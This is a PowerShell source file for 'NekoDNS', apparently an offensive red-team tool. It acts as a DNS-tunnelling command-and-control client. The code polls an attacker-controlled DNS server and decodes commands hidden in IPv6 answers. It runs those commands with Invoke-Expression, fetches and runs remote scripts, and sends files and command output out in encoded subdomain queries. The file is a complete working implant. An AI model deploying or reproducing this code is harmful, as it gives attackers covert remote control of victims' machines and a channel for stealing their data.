#=======================#
# NekoDNS by @JoelGMSec #
# https://darkbyte.net  #
#=======================#

function NekoDNS {
    param (
        [string]$Server,
        [string]$Domain,
        [int]$Length = 32,
        [int]$Sleep = 300,
        [switch]$Verbose,
        [switch]$Random,
        [switch]$TCP,
        [switch]$Help
    )

    function Show-Help {
        Write-Host @"
Usage: NekoDNS -Server <server> -Domain <domain> -Length <chunk_length> -Sleep <sleep_ms> -Random -Verbose -TCP
  -Server <server>       Attacker resolver DNS server IP (or domain) to use (required)
  -Domain <domain>       Base domain to tunnel over (required unless -Random)
  -Length <length>       Maximum hex-chars per chunk (default: 32)
  -Sleep <milsecs>       Sleep interval between polls/sends in ms (default: 300)
  -Random                Use random subdomains (if set, -Domain is optional)
  -Verbose               Enable debug/verbose output
  -TCP                   Use TCP for DNS queries
  -Help                  Show this help message
"@
        return
    }

    if ($Help) {
        Show-Help
        return
    }

    if ([string]::IsNullOrEmpty($Server)) {
        Write-Host "Error: -Server parameter is required." -ForegroundColor Red
        Show-Help
        return
    }

    if (-not $Random -and [string]::IsNullOrEmpty($Domain)) {
        Write-Host "Error: -Domain parameter is mandatory unless -Random is specified." -ForegroundColor Red
        Show-Help
        return
    }

    function Debug {
        param([string]$msg)
        if ($Verbose) {
            Write-Host "[DEBUG] $msg"
        }
    }

    function Get-RandomSubdomain {
        (-join ((65..90) + (97..122) + (48..57) | Get-Random -Count $length | ForEach-Object { [char]$_ })).ToLower()
    }

    function Get-RandomSegment {
        param([int]$minLen, [int]$maxLen)
        $length = Get-Random -Minimum $minLen -Maximum $maxLen
        -join ((0x61..0x7A) | Get-Random -Count $length | ForEach-Object { [char]$_ })
    }

    function Get-RandomDomain {
        $seg1 = Get-RandomSegment -minLen 2 -maxLen 4
        $seg2 = Get-RandomSegment -minLen 2 -maxLen 3
        return "$seg1.$seg2"
    }

    function Send-Chunk {
        param (
            [string]$Type,
            [string]$HexData,
            [string]$DomainToUse
        )
        if ([string]::IsNullOrEmpty($HexData)) {
            $dummyHex = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count $Length | ForEach-Object { [char]$_ })
            $dummyHex = $dummyHex.ToLower()
            $subdomain = "$Type.$dummyHex.$DomainToUse"
        } else {
            $reversedHex = -join ([char[]]$HexData)[($HexData.Length - 1)..0]
            $subdomain = "$Type.$reversedHex.$DomainToUse"
        }
        Debug "Sending chunk to: $subdomain"
        try {
            if ($TCP) {
                $dnsResponse = Resolve-DnsName -Type AAAA -Name $subdomain -Server $Server -ErrorAction Stop -TcpOnly
                Start-Sleep -Milliseconds $Sleep 
                return $dnsResponse 
            } else {
                $dnsResponse = Resolve-DnsName -Type AAAA -Name $subdomain -Server $Server -ErrorAction Stop
                Start-Sleep -Milliseconds $Sleep 
                return $dnsResponse 
            }
        } catch {
            $errorMessage = $_.Exception.Message
            Debug "DNS send error for $subdomain $errorMessage"
            Start-Sleep -Milliseconds $Sleep 
            return $null 
        }
    }

    function Convert-HexStringToByteArray {
        param([string]$HexString)
        if ([string]::IsNullOrEmpty($HexString)) { return @() }
        if ($HexString.Length % 2 -ne 0) { throw "Hex string must have an even length." }
        $byteArray = New-Object byte[] ($HexString.Length / 2)
        for ($i = 0; $i -lt $HexString.Length; $i += 2) {
            $hexPair = $HexString.Substring($i, 2)
            $byteArray[($i / 2)] = [System.Convert]::ToByte($hexPair, 16)
        }
        return $byteArray
    }

    function Send-FileContent {
        param (
            [string]$FilePath,
            [int]$ChunkLength,
            [string]$DomainToUse
        )
        try {
            $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
            $fileHex = ($fileBytes | ForEach-Object { $_.ToString("x2") }) -join ""
            $dynamicDomain = $(if ($Random) { Get-RandomDomain } else { $DomainToUse })
            Send-Chunk -Type "s" -HexData "" -DomainToUse $dynamicDomain | Out-Null

            for ($i = 0; $i -lt $fileHex.Length; $i += $ChunkLength) {
                $chunk = $fileHex.Substring($i, [Math]::Min($ChunkLength, $fileHex.Length - $i))
                Send-Chunk -Type "d" -HexData $chunk -DomainToUse $dynamicDomain | Out-Null
            }

            Send-Chunk -Type "e" -HexData "" -DomainToUse $dynamicDomain | Out-Null
            Debug "File content sent for '$FilePath'."
            $output = ""
            return $true

        } catch {
            Debug "Error sending file content for '$FilePath': $($_.Exception.Message)"
            $output = ""
            return $false
        }
    }

    $commandBuffer = ""
    while ($true) {
        $domainToUse = if ($Random) { Get-RandomDomain } else { $Domain }
        $pollName = "a." + (Get-RandomSubdomain) + ".$domainToUse"
        Debug "Polling with domain: $pollName"

        try {
            if ($TCP) {
                $resp = Resolve-DnsName -Type AAAA -Name $pollName -Server $Server -ErrorAction Stop -TcpOnly
                Start-Sleep -Milliseconds $Sleep 
                $ip = $resp.IPAddress
            } else {
                $resp = Resolve-DnsName -Type AAAA -Name $pollName -Server $Server -ErrorAction Stop
                Start-Sleep -Milliseconds $Sleep 
                $ip = $resp.IPAddress
            }
            
            Debug "Received IPv6: $ip"
            if ($ip -eq "::" -or $ip -eq "::1") {
                Debug "No command received. Sleeping..."
                Start-Sleep -Milliseconds $Sleep
                continue
            }

            try {
                $bytes = ([System.Net.IPAddress]::Parse($ip)).GetAddressBytes()
            } catch {
                Debug "Invalid IP received: '$ip'"
                continue
            }

            $hexStringFromIp = ($bytes | ForEach-Object { $_.ToString("x2") }) -join ""
            $lengthByte = $hexStringFromIp.Substring(0, 2)
            $lengthCmd = [Convert]::ToInt32($lengthByte, 16)
            Debug "Length of filtered Hex Chunk: $lengthByte"
            $commandHex = $hexStringFromIp.Substring(2, $lengthCmd * 2)
            Debug "Raw commandHex received from IP: $commandHex"

            if ([string]::IsNullOrEmpty($commandHex)) {
                Debug "Received empty hex command after trimming. Sleeping..."
                Start-Sleep -Milliseconds $Sleep
                continue
            }

            $reversedHex = -join ([char[]]$commandHex)[($commandHex.Length - 1)..0]
            $decodedBytes = Convert-HexStringToByteArray $reversedHex
            $decodedCommand = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
            Debug "Decoded command string: '$decodedCommand'"

            if ($decodedCommand.EndsWith("[->]")) {
                $commandPart = $decodedCommand.Substring(0, $decodedCommand.Length - 4) 
                $commandBuffer += $commandPart
                Debug "Command fragment received. Buffer: '$commandBuffer'"
                Start-Sleep -Milliseconds $Sleep
                continue
            } elseif ($commandBuffer) {
                if ($decodedCommand.StartsWith("[->]")) {
                    $decodedCommand = $decodedCommand.Substring(4) 
                }
                $decodedCommand = $commandBuffer + $decodedCommand
                Debug "Final command after reassembly: '$decodedCommand'"
                $commandBuffer = ""
            }

            Debug "Type of decodedCommand: $($decodedCommand.GetType().Name)"
            if ($decodedCommand.StartsWith("cd ", [System.StringComparison]::OrdinalIgnoreCase)) {
                $path = $decodedCommand.Substring(3).Trim()
                try {
                    Set-Location -LiteralPath $path -ErrorAction Stop *>&1 | Out-Null
                } catch {
                    $errorMessage = $_.Exception.Message
                    Debug "CD command failed: $errorMessage"
                    $output = ""
                }

            } elseif ($decodedCommand.StartsWith("upload ", [System.StringComparison]::OrdinalIgnoreCase)) {
                $paths = $decodedCommand.Substring(7).Trim().Split("!")
                if ($paths.Length -eq 2) {
                    $localPath = $paths[1]
                    $remotePath = $paths[0]
                    Send-Chunk -Type "s" -HexData "" -DomainToUse $domainToUse | Out-Null
                    Send-Chunk -Type "e" -HexData "" -DomainToUse $domainToUse | Out-Null
                    $isReceivingFile = $true
                    $fileHexBuffer = ""

                    Debug "Downloading file: $localPath"
                    $startTime = Get-Date
                    while ($isReceivingFile -and ((Get-Date) - $startTime).TotalSeconds -lt 120) {
                        $dynamicDomain = $(if ($Random) { Get-RandomDomain } else { $DomainToUse })
                        try {
                            $resp = Send-Chunk -Type "a" -HexData "" -DomainToUse $dynamicDomain

                            if (-not $resp) {
                                Start-Sleep -Milliseconds $Sleep
                                continue
                            }

                            $ip = $resp.IPAddress
                            if ($ip -eq "::") {
                                Start-Sleep -Milliseconds $Sleep
                                continue
                            }

                            $bytes = ([System.Net.IPAddress]::Parse($ip)).GetAddressBytes()
                            $hexStringFromIp = ($bytes | ForEach-Object { $_.ToString("x2") }) -join ""
                            $lengthByte = $hexStringFromIp.Substring(0, 2)
                            $lengthCmd = [Convert]::ToInt32($lengthByte, 16)
                            Debug "Length of filtered Hex Chunk: $lengthByte"
                            $commandHex = $hexStringFromIp.Substring(2, $lengthCmd * 2)
                            Debug "Raw Hex received from IP: $commandHex"
                            $reversedHex = -join ([char[]]$commandHex)[($commandHex.Length - 1)..0]

                            if ($ip -eq "::1") {

                                try {
                                    $byteArray = Convert-HexStringToByteArray $fileHexBuffer
                                    Debug "byteArray: $byteArray"
                                    [System.IO.File]::WriteAllBytes($localPath, $byteArray)
                                    Debug "File received and saved to '$localPath'"
                                    $output = ""
                                } catch {
                                    Debug "Failed to write file: $($_.Exception.Message)"
                                    $output = ""
                                }
                                $isReceivingFile = $false
                                $fileHexBuffer = ""
                                break
                            }

                            $fileHexBuffer += $reversedHex
                            Debug "Upload chunk received: $($fileHexBuffer)"

                        } catch {
                            Debug "Error during upload polling: $($_.Exception.Message)"
                            Start-Sleep -Milliseconds $Sleep  
                        }
                    }

                    if ($isReceivingFile) {
                        $output = "File reception timed out."
                        $isReceivingFile = $false
                        $fileHexBuffer = ""
                    }
                }

            } elseif ($decodedCommand.StartsWith("download ", [System.StringComparison]::OrdinalIgnoreCase)) {
                $paths = $decodedCommand.Substring("download ".Length).Split("!")
                if ($paths.Length -eq 2) {
                    $localPath = $paths[0]

                    if (Send-FileContent -FilePath $localPath -ChunkLength $Length -DomainToUse $domainToUse) {
                        $output = "[+] File '$localPath' content sent to server for download."
                    } else {
                        $output = "[!] Error reading/sending file '$localPath' content."
                    }
                }

            } elseif ($decodedCommand.StartsWith("import-ps1 ", [System.StringComparison]::OrdinalIgnoreCase)) {
                Debug "Processing import-ps1 command"
                $scriptHexBuffer = ""
                $isReceivingScript = $true
                $startTime = Get-Date
                $timeoutSeconds = 60

                Send-Chunk -Type "s" -HexData "" -DomainToUse $domainToUse | Out-Null
                Send-Chunk -Type "e" -HexData "" -DomainToUse $domainToUse | Out-Null
                Debug "Starting to receive PowerShell script chunks"

                while ($isReceivingScript -and ((Get-Date) - $startTime).TotalSeconds -lt $timeoutSeconds) {
                    $dynamicDomain = $(if ($Random) { Get-RandomDomain } else { $Domain })

                    try {
                        $resp = Send-Chunk -Type "a" -HexData "" -DomainToUse $dynamicDomain 

                        if (-not $resp) {
                            Start-Sleep -Milliseconds $Sleep
                            continue
                        }

                        $ip = $resp.IPAddress
                        Debug "Received IP for script: $ip"

                        if ($ip -eq "::") {
                            Start-Sleep -Milliseconds $Sleep
                            continue
                        }

                        if ($ip -eq "::1") {

                            Debug "End of script transmission received"
                            try {
                                if ($scriptHexBuffer.Length -gt 0) {
                                    $scriptBytes = Convert-HexStringToByteArray $scriptHexBuffer
                                    $scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes)
                                    Debug "Script content received, length: $($scriptContent.Length)"

                                    try {
                                        Invoke-Expression $scriptContent
                                        Debug "Script executed successfully"
                                        $output = ""
                                    } catch {
                                        Debug "Script execution failed: $($_.Exception.Message)"
                                        $output = ""
                                    }
                                } else {
                                    Debug "[!] No script content received."
                                    $output = ""
                                }
                            } catch {
                                Debug "Error processing script: $($_.Exception.Message)"
                                $output = ""
                            }
                            $isReceivingScript = $false
                            $scriptHexBuffer = ""
                            break 
                        }

                        $bytes = ([System.Net.IPAddress]::Parse($ip)).GetAddressBytes()
                        $hexStringFromIp = ($bytes | ForEach-Object { $_.ToString("x2") }) -join ""
                        $lengthByte = $hexStringFromIp.Substring(0, 2)
                        $lengthCmd = [Convert]::ToInt32($lengthByte, 16)
                        Debug "Length of filtered Hex Chunk: $lengthByte"
                        $commandHex = $hexStringFromIp.Substring(2, $lengthCmd * 2)
                        Debug "Raw Hex received from IP: $commandHex"
                        $reversedHex = -join ([char[]]$commandHex)[($commandHex.Length - 1)..0]
                        $scriptHexBuffer += $reversedHex
                        Debug "Script chunk received: $($scriptHexBuffer)"

                    } catch {
                        Debug "Error during script polling: $($_.Exception.Message)"
                        Start-Sleep -Milliseconds $Sleep
                        $output = ""
                    }
                }

                if ($isReceivingScript) {
                    Debug "[!] Script reception timed out."
                    $isReceivingScript = $false
                    $scriptHexBuffer = ""
                    $output = ""
                }

            } elseif ($decodedCommand.StartsWith("exit", [System.StringComparison]::OrdinalIgnoreCase)) {
                Debug "Received termination command - exiting client"
                Send-Chunk -Type "s" -HexData "" -DomainToUse $domainToUse | Out-Null
                Send-Chunk -Type "e" -HexData "" -DomainToUse $domainToUse | Out-Null
                Debug "Client exiting.."
                break
                exit

            } else {
                Debug "Executing: $decodedCommand"
                try {
                    $executionResult = Invoke-Expression $decodedCommand *>&1
                    if ($executionResult -eq $null) {
                        Debug "Command execution error"
                        $output = ""
                    } else {
                        $output = $executionResult | Out-String
                    }
                } catch {
                    $output = $_.Exception.Message
                    Debug "Command execution error: $output"
                    $output = ""
                }
            }

            $outputHex = ([System.Text.Encoding]::UTF8.GetBytes($output) | ForEach-Object { $_.ToString("x2") }) -join ""
            Send-Chunk -Type "s" -HexData "" -DomainToUse $domainToUse | Out-Null
            for ($i = 0; $i -lt $outputHex.Length; $i += $Length) {
                $chunk = $outputHex.Substring($i, [Math]::Min($Length, $outputHex.Length - $i))
                $domainToUse = if ($Random) { Get-RandomDomain } else { $Domain }
                Send-Chunk -Type "d" -HexData $chunk -DomainToUse $domainToUse | Out-Null
            }

            $domainToUse = if ($Random) { Get-RandomDomain } else { $Domain }
            Send-Chunk -Type "e" -HexData "" -DomainToUse $domainToUse | Out-Null

        } catch {
            Debug "Error during polling or processing: $($_.Exception.Message)"
            Start-Sleep -Milliseconds $Sleep
        }

        Start-Sleep -Milliseconds $Sleep
    }
}

# Examples
# NekoDNS -Server 88.66.44.22 -Domain test.com -Length 32 -Sleep 300 -Verbose -Random
# NekoDNS -Server 88.66.44.22 -Domain test.com -Length 32 -Sleep 300 -Verbose -Random -TCP

NekoDNS @args
